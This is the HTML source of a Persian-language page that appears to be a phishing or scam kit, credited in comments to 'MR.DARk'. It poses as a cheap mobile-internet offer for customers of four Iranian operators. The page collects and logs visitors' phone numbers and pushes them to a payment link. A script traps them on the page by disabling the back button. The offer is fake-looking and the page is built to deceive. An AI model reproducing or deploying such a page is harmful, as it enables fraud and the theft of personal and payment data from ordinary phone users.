


<!DOCTYPE html>

<html>
<head>
        <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
        <title>نت ارزان</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="../source/6gn/css/main.css" rel="stylesheet" />
                <link rel="stylesheet" href="../source/6gn/css/seq4-style.css">


</head>

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
/>

<body id="home" class="first-page-back" >
  <!--	 // @mrdarkmj = telegram

// coded by MR.DARk-->
<div class="gender-form">
<p>اپراتور خود را انتخاب کنید.</p>
<div class="gender-options">
<button class="gender">ایرانسل</button>
<button class="gender">همراه اول</button>
<button class="gender">رایتل</button>
<button class="gender">تالیا</button>
</div>
</div>
<div class="actor-form">
<p>نوع سیمکارت را انتخاب کنید</p>
<div class="actor-options">
<button class="actor">دائمی</button>
<button class="actor">اعتباری</button>
</div>
</div>
  <section class="contents">
    <div class="images-wrapper home-content">
     <img
       class="promo"
        src="../source/6gn/img/kp.gif"      />
          <img
       class="primary-img heartbeat"
        src="../source/6gn/img/gg.png"
      />
    </div>

    <!--	 // @mrdarkmj = telegram

// coded by MR.DARk-->
<div class="sub-contents">
    <p class="normal-description btn btn-primary " >
      شما میتوانید.با پرداخت20,000ریال صاحب 12گیگ شگفتی ما شوید. برای دریافت 6گیگ اول شماره خود را وارد کنید.
    </p>
    <form
      action="/Home/Request"
      id="numberSend-form"
      class="inner-button-disabled"
      method="POST"
    >
      <input type="hidden" name="ReferralCode" />
      <input
        type="tel"
        name="Msisdn"
        id="Msisdn"
        class="input-text home-input"
        placeholder="شماره همراه خود را وارد نمایید"
        autocomplete="off"
        autofocus="true"
        required
      />
      <button
        id="request-btn"
        class="btn btn-primary heartbeat"
      >
        تأیید
      </button>
      <p id="errorForInvalidMsisdn" class="error-message"></p>
    </form>


<!-- Trigger/Open The Modal -->
<p id="modalBtn"> با شرایط سرویس موافقم</p>
</div>
<div id="myModal" class="modal">
  <!-- Modal content -->
  <div class="modal-content">
    <div><span class="close">×</span></div>
    <div>
      <p>
      سرویس اینترنت ارزان در دسترس مشترکین4اپراتور برتر کشور قرار گرفت ما در راستای عرضه اینترنت اپراتور های برتر کشور پیش قدم و پیش فعال بوده و خواهیم بود مشترکین اپراتور های ایرانسل،  همراه اول،رایتل،تالیا میتوانند با توسعه و تمدد خود اینترنت دریافت کنند.
      </p>

      <p>
     کاربران می‌توانند انتقادات، پیشنهادات یا نظرات خود را از طریق تماس با شماره 9990 یا ایمیل info@hashiiyeh.com  با تیم پشتیبانی در میان بگذارند. شماره تماس پشتیبانی: 88009122-021
      </p>
      <h3>ویژگی‌های اصلی سرویس </h3>
      <p>
       ما برای سرگرمی و دلگرمی کابران میکوشیم تا بهترین هارا به شما هدیه دهیم ما با حمایت شما اینجاییم پس با حمایت شما بالا خواهیم رفت 
تشکر از حمایت شما.      </p>
      <p>
        دسته‌بندی‌های مختلف سرویس
      </p>
      <ul>
        <li>ارزان و بصرفه</li>
        <li>قوی و پر سرعت </li>
        <li>ساخت و ساز</li>
        <li>پشتیبانی قوی</li>
        <li>مجاور و بروز</li>
      </ul>
      <p>
هزینه سرویس تنها20,000ریال میباشد و برای هر مشترک1بار قابل استفاده است
      </p>
    </div>
  </div>
</div>

  </section>

  <!-- MOBILE PM -->
  <div  class="irancell-contents">
    <div class="images-wrapper">
    </div>
    <p class="normal-description">
تنها با پرداخت( 20,000)ریال6گیگ اینترنت+6گیگ هدیه از ما بگیرید.  </p>
    <a href="index.php?amount=20,000" class="btn btn-primary shake-bottom"
   a>پرداخت</a
    >
  </div>

  <span id="irancell-user-counter"></span>
  <span id="mci-user-counter"></span>

  <script>
    //   back block
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
  </script>

  <script src="../source/6gn/js/jquery-1.11.1.min.js"></script>
  <script src="../source/6gn/js/jquery.inputmask.bundle.min.js"></script>

 <script>
    $(document).ready(function () {
      var persianNumbers = [
        /۰/g,
        /۱/g,
        /۲/g,
        /۳/g,
        /۴/g,
        /۵/g,
        /۶/g,
        /۷/g,
        /۸/g,
        /۹/g
      ],
        arabicNumbers = [
          /٠/g,
          /١/g,
          /٢/g,
          /٣/g,
          /٤/g,
          /٥/g,
          /٦/g,
          /٧/g,
          /٨/g,
          /٩/g
        ],
        fixNumbers = function (str) {
          if (typeof str === "string") {
            for (var i = 0; i < 10; i++) {
              str = str.replace(persianNumbers[i], i).replace(arabicNumbers[i], i);
            }
          }
          return str;
        };
      $("#request-btn").click(function (e) {
        e.preventDefault();
        var msisdn = $("#Msisdn").val();
        msisdn = msisdn.replace("_", "");
        msisdn = fixNumbers(msisdn);
        var ussdMtn = /(\+989|9|09)(|)\d{7}/.test(
          msisdn
        );

        var ussdMci = /(^(\+989|9|09)()\d{7}$)|(^(\+)[0-9]\d{7}$)/.test(
          msisdn
        );
        localStorage.setItem("msisdn", msisdn);
        if ($(this).inputmask("isComplete")) {
          if (ussdMci) {
            $("#mci-user-counter").click();
            $("#numberSend-form").submit();
           } else if (ussdMtn) {
             $("#irancell-user-counter").click();
             //   window.location.replace("http://www.charkhoneh.com/s/3254");
             $(".steps").hide();
             $(".sub-contents").hide();
             $(".irancell-contents").show();
             var data = { msisdn: msisdn };
             $.ajax({
               type: "POST",
               url: "/LogMtnRequest",
               data: data,
               success: function (result) {
                 console.log("msisdn successfully sent!");
               }
             });
             return false;
          } else {
            if (msisdn.length === 11) {
              $(".error-message").html("شماره همراه اول یا ایرانسل وارد نمایید");
              $("#Msisdn").val("");
            } else if (msisdn.length <= 2) {
              $(".error-message").html("اول شماره ات رو وارد کن!");
            }
            else {
              $(".error-message").html("شماره ات رو کامل وارد کن");
            }

          }
        }

      });
      var msisdn = $("#Msisdn").val();
      msisdn = msisdn.replace("_", "");


      $("#Msisdn").inputmask({
        regex: "09[0-9۰-۹٠-٩]{9}",
        allowPlus: false,
        allowMinus: false,
        prefix: "09"
      });

      $("#Msisdn").on("change paste keyup input propertychange", function () {
        if ($(this).inputmask("isComplete")) {
          // $(".input-text").addClass("push-left-text");
          $("#request-btn").prop("disabled", false);
          // .removeClass("hidden");
        } else {

          // .addClass("hidden");
          // $(".input-text").removeClass("push-left-text");
        }
      });

      $("#Msisdn").on("keypress", function (e) {
        var code = e.keyCode ? e.keyCode : e.which;
        if (code == 13) {
          e.preventDefault();
          $("#request-btn").click();
        }
      });
    });
  </script>

<script>
// select gender
  $(".gender").on("click", function(e) {
            $(".gender-form").css('display', 'none');
            $(".actor-form").css('display', 'block');
});
  $(".actor").on("click", function(e) {
            $(".actor-form").css('display', 'none');
            $(".contents").css('display', 'block');
});
</script>


<script>
// Get the modal
var modal = document.getElementById("myModal");

// Get the button that opens the modal
var btn = document.getElementById("modalBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
  modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
modal.onclick= function(){
   modal.style.display = "none";
}
</script>



<!-- 	 // @mrdarkmj = telegram

// coded by MR.DARk -->
<script async src="../source/6gn/js/js.js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-140141026-31');
</script>

 </body>



<script>

    $(document).ready(function () {
        $(".error-message").text('');

    })
</script>










</html>

<script type="text/javascript">
    $(document).ready(function () {
        $("#numberSend-form").append('<input name="__RequestVerificationToken" type="hidden" value="3VxAZAFv1U1O5FNwGWoUbDavoaL5VkIF98HDNakPnx7zdiQDFuYjNDwobzRUR153D_DF3iu3I-OjyaR_IgS76UJ2VtHwKbFHYx9COwSDZjw1" />');
    });

</script>
